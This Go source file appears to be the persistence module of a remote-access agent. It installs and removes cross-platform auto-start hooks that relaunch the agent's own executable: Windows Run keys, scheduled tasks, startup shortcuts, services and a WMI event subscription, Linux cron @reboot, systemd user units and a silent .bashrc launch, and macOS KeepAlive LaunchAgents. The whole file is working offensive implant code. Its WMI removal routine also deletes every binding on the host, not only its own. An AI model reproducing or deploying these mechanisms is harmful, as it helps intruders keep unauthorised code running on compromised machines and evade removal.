package persist

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

func normalizeMethod(method string) string {
	methodMap := map[string]string{
		"registry":  "registry_run",
		"reg":       "registry_run",
		"run":       "registry_run",
		"schtask":   "schtasks_onlogon",
		"task":      "schtasks_onlogon",
		"scheduled": "schtasks_onlogon",
		"startup":   "startup_folder",
		"folder":    "startup_folder",
		"cron":      "cron_reboot",
		"systemd":   "systemd_user",
		"service":   "systemd_user",
		"bash":      "bashrc",
		"shell":     "bashrc",
		"launch":    "launchagent",
		"agent":     "launchagent",
		"plist":     "launchagent",
	}
	if normalized, exists := methodMap[strings.ToLower(method)]; exists {
		return normalized
	}
	return method
}

// SetupPersistence configures a persistence mechanism.
func SetupPersistence(method, name, agentPath string, args []string) error {
	normalizedMethod := normalizeMethod(method)
	if agentPath == "" {
		self, err := os.Executable()
		if err != nil {
			return fmt.Errorf("failed to resolve agent executable path: %w", err)
		}
		agentPath = self
	}

	switch runtime.GOOS {
	case "windows":
		return setupWindowsPersistence(normalizedMethod, name, agentPath, args)
	case "linux":
		return setupLinuxPersistence(normalizedMethod, name, agentPath, args)
	case "darwin":
		return setupMacOSPersistence(normalizedMethod, name, agentPath, args)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

// RemovePersistence removes a persistence mechanism.
func RemovePersistence(method, name string) error {
	normalizedMethod := normalizeMethod(method)

	switch runtime.GOOS {
	case "windows":
		return removeWindowsPersistence(normalizedMethod, name)
	case "linux":
		return removeLinuxPersistence(normalizedMethod, name)
	case "darwin":
		return removeMacOSPersistence(normalizedMethod, name)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

func setupWindowsPersistence(method, name, agentPath string, args []string) error {
	switch method {
	case "registry_run":
		return setupRegistryRun(name, agentPath, args)
	case "schtasks_onlogon":
		return setupScheduledTask(name, agentPath, args, "ONLOGON")
	case "schtasks_daily":
		return setupScheduledTask(name, agentPath, args, "DAILY")
	case "startup_folder":
		return setupStartupFolder(name, agentPath, args)
	case "service":
		return setupWindowsService(name, agentPath, args)
	case "wmi_event":
		return setupWMISubscription(name, agentPath, args)
	default:
		return fmt.Errorf("unknown Windows persistence method: %s", method)
	}
}

func removeWindowsPersistence(method, name string) error {
	switch method {
	case "registry_run":
		return removeRegistryRun(name)
	case "schtasks_onlogon", "schtasks_daily":
		return removeScheduledTask(name)
	case "startup_folder":
		return removeStartupFolder(name)
	case "service":
		return removeWindowsService(name)
	case "wmi_event":
		return removeWMISubscription(name)
	default:
		return fmt.Errorf("unknown Windows persistence method: %s", method)
	}
}

func setupWindowsService(name, agentPath string, args []string) error {
	binPath := fmt.Sprintf("\"%s\"", agentPath)
	if len(args) > 0 {
		binPath += " " + strings.Join(args, " ")
	}
	out, err := exec.Command("sc", "create", name,
		"binPath=", binPath, "start=", "auto", "DisplayName=", name,
	).CombinedOutput()
	if err != nil {
		return fmt.Errorf("sc create failed: %v — %s", err, out)
	}
	exec.Command("sc", "start", name).Run() //nolint:errcheck
	return nil
}

func removeWindowsService(name string) error {
	exec.Command("sc", "stop", name).Run() //nolint:errcheck
	out, err := exec.Command("sc", "delete", name).CombinedOutput()
	if err != nil {
		return fmt.Errorf("sc delete failed: %v — %s", err, out)
	}
	return nil
}

func setupWMISubscription(name, agentPath string, args []string) error {
	cmdLine := agentPath
	if len(args) > 0 {
		cmdLine += " " + strings.Join(args, " ")
	}
	ps := fmt.Sprintf(`
$filterName  = '%s_filter'
$consumerName = '%s_consumer'
$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"
$filter   = Set-WmiInstance -Namespace root\subscription -Class __EventFilter   -Arguments @{Name=$filterName;  EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$query}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name=$consumerName; CommandLineTemplate='%s'}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
`, name, name, cmdLine)
	out, err := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", ps).CombinedOutput()
	if err != nil {
		return fmt.Errorf("WMI subscription failed: %v — %s", err, out)
	}
	return nil
}

func removeWMISubscription(name string) error {
	ps := fmt.Sprintf(`
Get-WmiObject -Namespace root\subscription -Class __EventFilter          | Where-Object {$_.Name -eq '%s_filter'}   | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq '%s_consumer'} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
`, name, name)
	out, err := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", ps).CombinedOutput()
	if err != nil {
		return fmt.Errorf("WMI removal failed: %v — %s", err, out)
	}
	return nil
}

func setupRegistryRun(name, agentPath string, args []string) error {
	value := fmt.Sprintf("\"%s\"", agentPath)
	if len(args) > 0 {
		value += " " + strings.Join(args, " ")
	}
	cmd := exec.Command("reg", "add",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", name, "/t", "REG_SZ", "/d", value, "/f")
	if _, err := cmd.CombinedOutput(); err != nil {
		cmd = exec.Command("reg", "add",
			"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", name, "/t", "REG_SZ", "/d", value, "/f")
		if output, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("failed to add registry key: %v - %s", err, output)
		}
	}
	return nil
}

func removeRegistryRun(name string) error {
	cmd := exec.Command("reg", "delete",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", name, "/f")
	if _, err := cmd.CombinedOutput(); err != nil {
		cmd = exec.Command("reg", "delete",
			"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", name, "/f")
		if output, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("failed to remove registry key: %v - %s", err, output)
		}
	}
	return nil
}

func setupScheduledTask(name, agentPath string, args []string, schedule string) error {
	cmdArgs := []string{
		"/create", "/tn", name,
		"/tr", fmt.Sprintf("\"%s\" %s", agentPath, strings.Join(args, " ")),
		"/sc", schedule, "/f",
	}
	if schedule == "DAILY" {
		cmdArgs = append(cmdArgs, "/st", "09:00")
	}
	if output, err := exec.Command("schtasks", cmdArgs...).CombinedOutput(); err != nil {
		return fmt.Errorf("failed to create scheduled task: %v - %s", err, output)
	}
	return nil
}

func removeScheduledTask(name string) error {
	if output, err := exec.Command("schtasks", "/delete", "/tn", name, "/f").CombinedOutput(); err != nil {
		return fmt.Errorf("failed to remove scheduled task: %v - %s", err, output)
	}
	return nil
}

func setupStartupFolder(name, agentPath string, args []string) error {
	startupPath := filepath.Join(os.Getenv("APPDATA"),
		"Microsoft\\Windows\\Start Menu\\Programs\\Startup",
		name+".lnk")
	vbsContent := fmt.Sprintf(`
Set objShell = CreateObject("WScript.Shell")
Set objShortcut = objShell.CreateShortcut("%s")
objShortcut.TargetPath = "%s"
objShortcut.Arguments = "%s"
objShortcut.WorkingDirectory = "%s"
objShortcut.Save
`, startupPath, agentPath, strings.Join(args, " "), filepath.Dir(agentPath))
	vbsPath := filepath.Join(os.TempDir(), "create_shortcut.vbs")
	if err := os.WriteFile(vbsPath, []byte(vbsContent), 0644); err != nil {
		return fmt.Errorf("failed to create VBS script: %v", err)
	}
	defer os.Remove(vbsPath)
	if output, err := exec.Command("cscript", "/nologo", vbsPath).CombinedOutput(); err != nil {
		return fmt.Errorf("failed to create startup shortcut: %v - %s", err, output)
	}
	return nil
}

func removeStartupFolder(name string) error {
	startupPath := filepath.Join(os.Getenv("APPDATA"),
		"Microsoft\\Windows\\Start Menu\\Programs\\Startup",
		name+".lnk")
	return os.Remove(startupPath)
}

func setupLinuxPersistence(method, name, agentPath string, args []string) error {
	switch method {
	case "cron_reboot":
		return setupCronReboot(name, agentPath, args)
	case "systemd_user":
		return setupSystemdUser(name, agentPath, args)
	case "bashrc":
		return setupBashrc(name, agentPath, args)
	default:
		return fmt.Errorf("unknown Linux persistence method: %s", method)
	}
}

func removeLinuxPersistence(method, name string) error {
	switch method {
	case "cron_reboot":
		return removeCronReboot(name)
	case "systemd_user":
		return removeSystemdUser(name)
	case "bashrc":
		return removeBashrc(name)
	default:
		return fmt.Errorf("unknown Linux persistence method: %s", method)
	}
}

func setupCronReboot(name, agentPath string, args []string) error {
	cronLine := fmt.Sprintf("@reboot %s %s # %s", agentPath, strings.Join(args, " "), name)
	cmd := exec.Command("crontab", "-l")
	output, _ := cmd.Output()
	newCron := string(output) + cronLine + "\n"
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCron)
	return cmd.Run()
}

func removeCronReboot(name string) error {
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.Output()
	if err != nil {
		return fmt.Errorf("failed to read crontab: %v", err)
	}
	lines := strings.Split(string(output), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, "# "+name) {
			newLines = append(newLines, line)
		}
	}
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(strings.Join(newLines, "\n"))
	return cmd.Run()
}

func setupSystemdUser(name, agentPath string, args []string) error {
	serviceContent := fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s %s
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
`, name, agentPath, strings.Join(args, " "))
	servicePath := filepath.Join(os.Getenv("HOME"), ".config/systemd/user", name+".service")
	os.MkdirAll(filepath.Dir(servicePath), 0755)
	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return fmt.Errorf("failed to write service file: %v", err)
	}
	exec.Command("systemctl", "--user", "daemon-reload").Run() //nolint:errcheck
	if err := exec.Command("systemctl", "--user", "enable", name).Run(); err != nil {
		return fmt.Errorf("failed to enable service: %v", err)
	}
	return exec.Command("systemctl", "--user", "start", name).Run()
}

func removeSystemdUser(name string) error {
	exec.Command("systemctl", "--user", "stop", name).Run()    //nolint:errcheck
	exec.Command("systemctl", "--user", "disable", name).Run() //nolint:errcheck
	servicePath := filepath.Join(os.Getenv("HOME"), ".config/systemd/user", name+".service")
	if err := os.Remove(servicePath); err != nil {
		return fmt.Errorf("failed to remove service file: %v", err)
	}
	exec.Command("systemctl", "--user", "daemon-reload").Run() //nolint:errcheck
	return nil
}

func setupBashrc(name, agentPath string, args []string) error {
	bashrcPath := filepath.Join(os.Getenv("HOME"), ".bashrc")
	content, err := os.ReadFile(bashrcPath)
	if err != nil {
		return fmt.Errorf("failed to read bashrc: %v", err)
	}
	persistLine := fmt.Sprintf("\n# %s\n(%s %s &) 2>/dev/null\n", name, agentPath, strings.Join(args, " "))
	return os.WriteFile(bashrcPath, append(content, []byte(persistLine)...), 0644)
}

func removeBashrc(name string) error {
	bashrcPath := filepath.Join(os.Getenv("HOME"), ".bashrc")
	content, err := os.ReadFile(bashrcPath)
	if err != nil {
		return fmt.Errorf("failed to read bashrc: %v", err)
	}
	lines := strings.Split(string(content), "\n")
	var newLines []string
	skip := false
	for _, line := range lines {
		if strings.Contains(line, "# "+name) {
			skip = true
			continue
		}
		if skip && strings.TrimSpace(line) == "" {
			skip = false
			continue
		}
		if !skip {
			newLines = append(newLines, line)
		}
	}
	return os.WriteFile(bashrcPath, []byte(strings.Join(newLines, "\n")), 0644)
}

func setupMacOSPersistence(method, name, agentPath string, args []string) error {
	switch method {
	case "launchagent":
		return setupLaunchAgent(name, agentPath, args)
	default:
		return fmt.Errorf("unknown macOS persistence method: %s", method)
	}
}

func removeMacOSPersistence(method, name string) error {
	switch method {
	case "launchagent":
		return removeLaunchAgent(name)
	default:
		return fmt.Errorf("unknown macOS persistence method: %s", method)
	}
}

func setupLaunchAgent(name, agentPath string, args []string) error {
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>`, name, agentPath)
	for _, arg := range args {
		plistContent += fmt.Sprintf("\n        <string>%s</string>", arg)
	}
	plistContent += `
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`
	plistPath := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents", name+".plist")
	os.MkdirAll(filepath.Dir(plistPath), 0755)
	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		return fmt.Errorf("failed to write plist: %v", err)
	}
	return exec.Command("launchctl", "load", plistPath).Run()
}

func removeLaunchAgent(name string) error {
	plistPath := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents", name+".plist")
	exec.Command("launchctl", "unload", plistPath).Run() //nolint:errcheck
	return os.Remove(plistPath)
}
